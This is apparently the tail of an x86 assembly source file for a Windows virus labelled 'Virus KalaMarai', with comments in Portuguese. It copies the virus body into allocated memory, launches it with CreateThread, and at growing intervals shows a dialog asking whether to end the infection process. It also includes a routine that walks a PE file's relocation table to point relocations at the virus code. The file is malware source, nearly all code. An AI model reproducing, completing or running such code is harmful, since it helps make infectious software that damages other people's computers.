          call GlobalAlloc                         ;aloca alguma memoria
          mov ebp, eax
          mov edi, eax
          mov esi, ofs v_ini
          mov ecx, (ofs v_fim-ofs v_ini)           ;copia virus(pra testar relocs)
          rep movsb
          push ecx                                 ;ecx=zero
          push esp                                 ;*ThreadID
          push ecx
          push ecx
          add ebp, ofs entrada-ofs v_ini
          push ebp                                 ;ebp=inicio do virus
          push ecx
          push ecx
    extrn CreateThread:PROC
          call CreateThread                        ;executa virus
          pop eax
     pergunta:
          push 4
          @pushsz "Virus KalaMarai"
          @pushsz "Terminar processo?"
          push 0
    extrn MessageBoxA:PROC
          call MessageBoxA
          cmp al, 6                                ;termina processo de infe‡Æo?
          je saifora
          add [tempo], 5*60*1000                   ;5,10,15...
          push dwo [tempo]
    extrn Sleep:PROC
          call Sleep                               ;espera 5+ minuto
          jmp pergunta                             ;pergunta de novo...
     aponta:
          push edx                                 ;reloca‡Æo aponta para o virus
          mov edx, [esi]
          sub edx, 2000h                           ;base das reloca‡äes
          lodsd
          lodsd
          xchg ecx, eax
          sub ecx, 8
          shr ecx, 1                               ;ecx=numero de reloca‡äes
          sub eax, eax
     proxima:
          lodsw
          test eax, eax                            ;reloca‡Æo nula?
          jz nula
          and ax, 0000111111111111b                ;limpa TIPO
          add eax, edx
          not ax
          stosw                                    ;armazena deslocamento da anterior
          inc dwo [numeroreloc]
     nula:
          loop proxima
          pop edx
          jmp reloca                               ;bloco processado...

   end    start
